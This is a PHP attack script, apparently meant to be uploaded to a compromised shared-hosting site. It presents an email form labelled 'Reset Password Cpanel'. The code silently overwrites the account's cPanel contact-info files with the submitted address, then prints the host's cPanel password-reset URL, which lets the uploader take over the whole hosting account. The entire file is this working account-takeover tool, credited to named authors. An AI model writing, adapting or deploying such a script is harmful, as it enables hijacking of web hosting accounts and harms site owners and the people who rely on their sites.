<?php
############################
##Script Resetpass Cpanel ##
##Coded By Naufal Ardhani ##
## www.naufalardhani.com  ##
############################
echo '<html>
    <head> 
    <link rel="shortcut icon" href="https://cdn.kualo.com/website/icon_cpanel.png">
    
	      <title>Reset Password Cpanel  </title>
	      <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<body bgcolor=black>
</body>
<style>
input[type="email"] {
  border: 1px solid #ddd;
  padding: 4px 8px;
}

input[type="email"]:focus {
  border: 1px solid #000;
}

input[type="submit"] {
  font-weight: bold;
  padding: 4px 8px;
  border:1px solid #000;
  background: black;
  color:#fff;
}
</style>
      	</head>
     <body>
	 <!--SCC -->
       <center> 	
       <br><br><br><br><br><br><br><br><br><br><br><br><font color="white" size="5"><b>Reset Password Cpanel</b></font><br><br> 
	   <div style="border-radius: 6px;border: 1px solid white;padding: 4px 2px;width: 25%;line-height: 24px;background: green;color:white;">
	   <br>
	<p>   
	    <form action="#" method="post">
	    <b> Email : </b>
	<input type="email" name="email" style="background-color: white;font: 9pt tahoma;color:white;" />
	<input type="submit" name="submit" value="Send" style="style="border-radius: 6px;font: 9pt tahoma;color:white;"/>
	
	</form>
	<br>
	</p>
	</div>
	<br>
	<font color="white" size="4">Coded by Naufal Ardhani | Recoded by k0v3T</font>
   </center>
    </body>
</html>';

$user = get_current_user();
$site = $_SERVER['HTTP_HOST'];
$ips = getenv('REMOTE_ADDR');

if(isset($_POST['submit'])){
	
	$email = $_POST['email'];
	$wr = 'email:'.$email;
$f = fopen('/home/'.$user.'/.cpanel/contactinfo', 'w');
fwrite($f, $wr); 
fclose($f);
$f = fopen('/home/'.$user.'/.contactinfo', 'w');
fwrite($f, $wr); 
fclose($f);
$parm = $site.':2083/resetpass?start=1';
echo '<br/><center>'.$parm.'</center>';
}
